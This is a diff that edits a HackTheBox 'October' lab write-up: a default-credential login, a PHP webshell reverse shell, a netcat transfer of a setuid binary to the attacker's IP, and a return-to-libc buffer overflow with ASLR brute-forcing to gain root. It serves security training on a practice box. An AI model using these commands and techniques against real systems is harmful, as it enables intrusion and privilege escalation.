@@ -55,36 +55,36 @@ gobuster dir -u http://10.10.10.16/ -w /usr/share/wordlists/dirbuster/directory-
 ```
 
 The findings with the Code 301 and 200 are uninteresting but the _/backend_ forwards us to _/backend/backend/auth/signin_ where we get a login page.
-Trying the default credentials **admin / admin** we get are logged in.
+Trying the default credentials **admin / admin** we get logged in.
 
-Now we can upload any PHP Webshell (mine listens on my IP and port 9001:
+Now we can upload any PHP Webshell (mine listens on my IP and port 9001):
 
 ![Uploading PHP Webshell](https://kyuu-ji.github.io/htb-write-up/october/october_webshell.png)
 
-Browsing to the file starts a reverse shell on the box as the user www-data but we can read the user flag.
+Browsing to the file starts a reverse shell on the box as the user www-data and we can read the user flag.
 
 ## Privilege Escalation
 
-We search for files the got the setuid bit set:
+We search for files that have the setuid bit set:
 ```markdown
 find / -perm -4000 2>/dev/null
 ```
 
 One binary that sticks out is called **/usr/local/bin/ovrflw** and this is what we want to use. Lets upload it to our local machine to examine it.
 ```markdown
-Local machine:
+# Local machine:
 nc -l -p 999 > ovrflw
 
-October box:
+# October box:
 nc 10.10.14.8 999 < /usr/local/bin/ovrflw
 ```
 
 Before examining binaries we should get a machine that is similar to the box to get the best results when doing Binary Analysis.
-In this case the October box is **Ubuntu 14.04.5 LTS** and **32-bit** and we need a machine that meets these conditions.
+In this case the October box is **Ubuntu 14.04.5 LTS** and **32-bit** and we need a machine that meets these conditions where we will test all of this.
 
 ### Binary Exploitation
 
-When executing the _ovrflw_ binary it tells us that it wants an input string. Giving it any input it does nothing but giving it for example 200 times the character "A" it outputs a **Segmantation Fault**.
+When executing the _ovrflw_ binary it tells us that it wants an input string. Giving it any input it does nothing. But giving it for example 200 times the character "A" it outputs a **Segmentation Fault**.
 
 ```markdown
 ./ovrflw `python -c 'print "A"*200'`
@@ -156,3 +156,89 @@ The program crashes at 0x64413764.
 
 Which is at 112 bytes where we start to overwrite EIP.
 
+#### Exploiting the binary
+
+We can test if this is true with this small Python script:
+```python
+import struct
+
+buf = "A" * 112
+buf += struct.pack("<I",0xd3adc0d3)
+
+print(buf)
+```
+
+After running the binary with this it breaks at 0xd3adc0d3 as we expected:
+
+![Testing Buffer Overflow](https://kyuu-ji.github.io/htb-write-up/october/october_gdb_4.png)
+
+We are going to do a **Return-to-libc Attack** because of the DEP protection so we need to drop the memory location to the system syscall and have that point to a string we control to execute the code. So we are never executing code off the stack but let a instruction appear out of nowhere.
+
+Before we can write a script we need to following information
+- Memory address of system
+  - `gdb-peda$ p system`
+- Memory address of exit
+  - `gdb-peda$ p exit`
+- Memory address of /bin/sh
+  - `gdb-peda$ searchmem /bin/sh`
+
+![Collecting memory addresses](https://kyuu-ji.github.io/htb-write-up/october/october_gdb_5.png)
+
+Now we have enough information to write a script to exploit this. This script is in this folder called **october-bof.py**.
+```markdown
+./ovrflw `python october-bof.py`
+```
+
+After running this on our test machine it prompts us a shell.
+
+#### Brute-Forcing ASLR
+
+This script won't work on the box because ASLR will change the addresses so we need to bypass that.
+
+If we analyze the output of the random addresses on the box we can see that it doesn't change by that much:
+```markdown
+for i in `seq 0 20`; do ldd ovrflw | grep libc; done
+
+# Output
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75c3000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75e8000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75da000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7557000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7566000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7630000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7583000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75fb000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb758e000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7607000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7570000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75bb000)
+libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb759a000)
+(...)
+```
+
+| 1 bit | 2 bit | 3 bit | 4 bit | 5 bit | 6 bit | 7 bit | 8 bit |
+|-------|-------|-------|-------|-------|-------|-------|-------|
+|   B   |   7   | 5 / 6 | 0 - F | 0 - F |   0   |   0   |   0   |
+
+- 3rd bit has 2 possible values
+- 4th bit has 16 possible values
+- 5th bit has 16 possible values
+
+So if we run this binary **512** times there is a chance that we hit the exact address and **Brute-Force ASLR**.
+First we need this information because the addresses are not the same as on the test machine:
+- Offset address of system
+  - `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system`
+    - system@@GLIBC_2.0: 0x00040310
+- Offset address of exit
+  - `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit`
+    - exit@@GLIBC_2.0: 0x00033260
+- Memory address of /bin/sh
+  - `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh`
+    - /bin/sh: 0x00162bac
+
+We will modify the script and I call it **october-aslr-bof.py** that we will run on the box:
+```markdown
+python october-aslr-bof.py
+```
+
+The script brute-forces the addresses and when it hits the correct one we get a shell as root!
